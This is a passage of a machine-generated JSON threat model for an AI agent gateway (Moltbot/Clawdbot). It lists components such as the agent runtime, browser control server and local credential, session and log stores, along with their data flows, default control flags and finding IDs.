"allowsClientSideScripting": false, "assumptions": [], "codeType": "Unmanaged", "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "environment": "", "findings": ["139", "140", "141", "142", "143", "144", "145", "146", "147", "148", "149", "150", "151", "152", "153", "154", "155", "156", "157", "158", "159", "160", "161", "162", "163", "164", "165", "166", "167", "168", "169", "170", "171", "172"], "handlesResources": false, "implementsAPI": false, "implementsCommunicationProtocol": false, "inBoundary": "Gateway Host (Local)", "inScope": true, "inputs": ["Model inference response", "Dispatch session to agent runtime", "Node tool responses", "Browser control responses"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Agent Runtime", "onAWS": false, "outputs": ["Model inference request", "Agent output + tool results", "Invoke node tools", "Browser control requests"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["src/auto-reply/reply/agent-runner.ts"], "tracksExecutionFlow": false, "usesEnvironmentVariables": false}, {"__class__": "Server", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["173", "174", "175", "176", "177", "178", "179", "180", "181", "182", "183", "184", "185", "186", "187", "188", "189", "190", "191", "192", "193", "194", "195", "196", "197", "198", "199", "200", "201", "202", "203", "204", "205", "206", "207", "208", "209", "210", "211", "212", "213", "214", "215", "216"], "handlesResources": false, "inBoundary": "Gateway Host (Local)", "inScope": true, "inputs": ["Browser control requests"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Browser Control Server", "onAWS": false, "outputs": ["Browser control responses"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["src/gateway/server-browser.ts"], "usesCache": false, "usesEnvironmentVariables": false, "usesSessionTokens": false, "usesVPN": false, "usesXMLParser": false}, {"__class__": "Server", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["217", "218", "219", "220", "221", "222", "223", "224", "225", "226", "227", "228", "229", "230", "231", "232", "233", "234", "235", "236", "237", "238", "239", "240", "241", "242", "243", "244", "245", "246", "247", "248", "249", "250", "251", "252", "253", "254", "255", "256", "257", "258", "259", "260"], "handlesResources": false, "inBoundary": "Node Hosts", "inScope": true, "inputs": ["Invoke node tools"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Node Host Agent", "onAWS": false, "outputs": ["Node tool responses"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["docs/nodes/index.md"], "usesCache": false, "usesEnvironmentVariables": false, "usesSessionTokens": false, "usesVPN": false, "usesXMLParser": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["261", "262", "263", "264"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": ["Read/write configuration"], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Config Store (moltbot.json)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/gateway/configuration.md", "src/config"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["265", "266", "267", "268"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": ["Read/write credentials"], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Credentials Store (~/.clawdbot/credentials)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/gateway/authentication.md", "docs/testing.md"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["269", "270", "271", "272"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": ["Update session metadata"], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Session Store (sessions.json)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/reference/session-management-compaction.md", "src/config/sessions.ts"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["273", "274", "275", "276"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": ["Append transcripts"], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Transcript Store (*.jsonl)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/reference/session-management-compaction.md", "src/config/sessions.ts"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["277", "278", "279", "280"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": ["Write operational logs"], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Log Store (~/.clawdbot/logs)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/gateway/logging.md", "src/hooks/bundled/command-logger/handler.ts"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["281", "282", "283", "284"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": [], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Plugin Store (~/.clawdbot/extensions)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/plugin.md", "src/plugins"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}], "flows": [{"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Runtime Configuration"], "description": "", "dstPort": -1, "findings": ["285", "286", "287", "288", "289", "290", "291"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Operator runs CLI commands", "note": "", "order": 1, "overrides": [], "protocol": "local", "response": null, "responseTo": null, "severity": 5, "sink": "Moltbot CLI", "source": "Operator", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Gateway Auth Token/Password"], "description": "", "dstPort": 18789, "findings": ["292", "293", "294", "295", "296", "297", "298"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "CLI connects to Gateway WS/HTTP", "note": "", "order": 2, "overrides": [], "protocol": "WebSocket/HTTP", "response": null, "responseTo": null, "severity": 5, "sink": "Gateway WS/HTTP Server", "source": "Moltbot CLI", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Gateway Auth Token/Password"], "description": "", "dstPort": 18789, "findings": ["299", "300", "301", "302", "303", "304", "305"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "UI connects to Gateway WS", "note": "", "order": 3, "overrides": [], "protocol": "WebSocket", "response": null, "responseTo": null, "severity": 5, "sink": "Gateway WS/HTTP Server", "source": "WebChat / macOS UI", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Session Messages + Tool Output"], "description": "", "dstPort": 18789, "findings": ["306", "307", "308", "309", "310", "311", "312"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "External client uses Gateway HTTP APIs", "note": "", "order": 4, "overrides": [], "protocol": "HTTP", "response": null, "responseTo": null, "severity": 5, "sink": "Gateway WS/HTTP Server", "source": "External API Client", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Session Messages + Tool Output"], "description": "", "dstPort": -1, "findings": ["313", "314", "315", "316", "317", "318", "319"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "End user sends channel message", "note": "", "order": 5, "overrides": [], "protocol": "provider-specific", "response": null, "responseTo": null, "severity": 5, "sink": "Channel Provider APIs", "source": "Channel End User", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Session Messages + Tool Output"], "description": "", "dstPort": -1, "findings": ["320", "321", "322", "323", "324", "325", "326"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Inbound channel events to Gateway", "note": "", "order": 6, "overrides": [], "protocol": "provider-specific", "response": null, "responseTo": null, "severity": 5, "sink": "Channel Adapters", "source": "Channel Provider APIs", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Session Messages + Tool Output"], "description": "", "dstPort": -1, "findings": ["327", "328", "329", "330", "331", "332", "333"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Normalized inbound messages", "note": "", "order": 7, "overrides": [], "protocol": "local", "response": null, "responseTo": null, "severity": 5, "sink": "Gateway WS/HTTP Server", "source": "Channel Adapters", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Session Messages + Tool Output"], "description": "", "dstPort": -1, "findings": ["334", "335", "336", "337", "338", "339", "340"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Outbound messages to channels", "note": "", "order": 8, "overrides": [], "protocol": "provider-specific", "response": null, "responseTo": null, "severity": 5, "sink": "Channel Provider APIs", "source": "Channel Adapters", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, 